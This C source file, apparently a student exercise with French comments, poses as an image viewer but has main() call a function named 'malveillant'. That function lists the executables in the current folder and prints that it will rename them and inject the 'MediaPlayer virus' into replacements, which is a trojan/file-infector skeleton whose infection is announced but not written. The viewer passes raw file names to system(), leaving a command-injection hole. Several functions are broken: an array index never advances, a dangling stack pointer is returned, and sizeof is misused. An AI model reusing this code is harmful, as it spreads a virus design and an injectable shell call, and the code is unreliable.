#include "MediaPlayer.h"

int main() {

        //mediaplayer();
        malveillant();

        return 0;
}

/*
        Vérifie si la fonction contient ".jpeg"
*/
bool checkStringContains(char *fileName) {
        char *lookingFor = ".jpeg";
        return strstr(fileName,lookingFor);
}

/*
        Lance la commande xdg-open, lancant l'afficheur d'images
*/
void afficheImage(char *fileName) {

        char *display = "xdg-open ";
        char *String = malloc(strlen(display) + strlen(fileName) + 1);
        if(String) {
                strcpy(String,display);
                strcat(String,fileName);
        }
        system(String);
}

/*
        Liste les fichiers possedant l'extension demandée
*/
void listeFichier(char *extension) {
        DIR *myDir;
        int cptImg = 0;
        struct dirent *dir;

        // FIRST PARSING
        myDir = opendir(".");
        if (myDir) {
                while ((dir = readdir(myDir)) != NULL) {

                        if (strstr(dir->d_name,extension)) {
                                cptImg++;
                        }
                }
                closedir(myDir);
        }

        printf("%d files found\n",cptImg);
        const char *imageNames[cptImg];
        if (cptImg > 0) {
                // SECOND PARSING
                myDir = opendir(".");
                if (myDir) {
                        int i = 0;
                        while ((dir = readdir(myDir)) != NULL) {
                                if (strstr(dir->d_name,extension)) {
                                        imageNames[i] = dir->d_name;
                                        i++;
                                }
                        }
                        closedir(myDir);
                }

                for(int i=0 ; i < cptImg ; i++) {
                        printf("file %d -> %s\n",i+1,imageNames[i]);
                }

                afficheImage((char *)imageNames[0]);
        }

}

void mediaplayer () {
        listeFichier(".jpeg");
}

/*
        Compte le nombre de fichiers executables dans le dossier à l'execution
*/
const char * cptExec() {
        DIR *myDir;
        int cptExec = 0;
        struct dirent *dir;

        // FIRST PARSING
        myDir = opendir(".");
        if (myDir) {
                while ((dir = readdir(myDir)) != NULL) {
                        if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name))) {
                                if (access(dir->d_name, X_OK) == 0) {
                                        printf("%s is executable\n",dir->d_name);
                                        cptExec++;
                                }
                        }
                }
                closedir(myDir);
        }

        if (cptExec > 0) {
                const char *execNames[cptExec];

                myDir = opendir(".");
                if (myDir) {
                        int i = 0;
                        while ((dir = readdir(myDir)) != NULL) {
                                if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name))) {
                                        if (access(dir->d_name, X_OK) == 0) {
                                                execNames[i] = dir->d_name;
                                        }
                                }
                        }
                        closedir(myDir);
                }
                return *execNames;
        }
        return 0;
}

void malveillant() {
        printf("Bad things happens bruh\n");
        //system("cat MediaPlayer");
        printf("Listing executables..\n\n");
        const char * exname = cptExec();

        for(int i=0; i < sizeof(exname)-1; i++) {
                printf("\n%s\n",&exname[i]);
        }
        printf("\n%s\n",&exname[0]);
        printf("\n%s\n",&exname[1]);


        printf("Renaming all executables with xxx.old\n");
        printf("Création of new executables with the same name as the previous ones..\n");
        printf("Injection du code du virus MediaPlayer dans les nouveaux executables..\n");


}
